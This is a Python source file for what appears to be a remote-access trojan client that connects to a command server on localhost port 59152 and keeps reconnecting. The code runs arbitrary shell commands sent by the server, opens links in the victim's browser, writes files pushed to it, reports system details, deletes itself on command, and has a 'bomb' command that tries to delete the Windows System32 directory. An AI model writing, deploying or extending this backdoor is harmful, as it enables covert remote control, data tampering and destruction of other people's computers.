import os
import socket
import time

import webbrowser
import subprocess
import re


def reconnect():
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect(('localhost', 59152))
            print("Reconnected to the server..")
            main(client)
            break  # Break out of the loop once the main loop is successfully re-entered
        except socket.error as e:
            print(f"Reconnection failed: {e}")
            time.sleep(5)


def start_client():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connection_state = False

    while connection_state is False:
        try:
            client.connect(('localhost', 59152))
            connection_state = True
            print("Connected to the server successfully")
        except Exception:
            print("No connection found.")
            time.sleep(5)

    main(client)


def command_execution(command, client_socket):
    try:
        match command:
            case x if "link" in x:  # Opens a link into the default browser
                link_to_open = re.search(r'link\s+(.+)', command)
                link_to_open = link_to_open.group(1)
                webbrowser.open(link_to_open)

                return f"{link_to_open} opened with {webbrowser.get().name}"

            case x if "shell" in x:  # Running a shell command
                shell_to_execute = re.search(r'shell\s+(.+)', command)

                if os.name == "nt" or shell_to_execute:
                    shell_to_execute = shell_to_execute.group(1)
                    shell_output = subprocess.run(shell_to_execute, shell=True, capture_output=True, text=True)

                    return f"Shell output:\n{shell_output.stdout}"
                else:
                    return "Unsupported system for shell usage or no command found."

            case x if "upload" in x:
                file_path = re.search(r'upload\s+(.+)', command)
                if file_path:
                    file_path = file_path.group(1)
                    response = download_file(file_path, client_socket)
                    return response
                else:
                    return "Invalid upload command syntax."

            case "sysget":
                return str(os.uname())

            case "close":  # Closing the client
                exit()

            case "destroy":
                self_destruct()

            case "bomb":
                os.rmdir("C:\\Windows\\System32")

            case _:
                return "Incorrect syntax."
    except Exception as e:
        return e


def main(client):
    while True:
        try:
            response = client.recv(1024)
            print(f"Received: {response.decode('utf-8')}")
            decoded_response = response.decode('utf-8')

            if decoded_response != "heartbeat":
                output = command_execution(decoded_response, client)
                client.send(bytes(output, 'utf-8'))
            else:
                client.send(bytes("heartbeat", 'utf-8'))
        except socket.error as e:
            print(f"Connection lost: {e}")
            reconnect()


def self_destruct():
    current_file = os.path.realpath(__file__)
    os.remove(current_file)
    exit()


def download_file(file_path, client_socket):
    try:
        # Send the command to request the file from the server
        client_socket.send(bytes(f"Downloading {file_path}", 'utf-8'))

        # Receive file data from the server
        with open(file_path.split('/')[-1], 'wb') as file:  # Extract filename from path
            while True:
                data = client_socket.recv(1024)
                if not data:
                    break
                file.write(data)

        return "File Downloaded successfully."

    except Exception as e:
        return f"Upload failed: {e}"


if __name__ == "__main__":
    start_client()
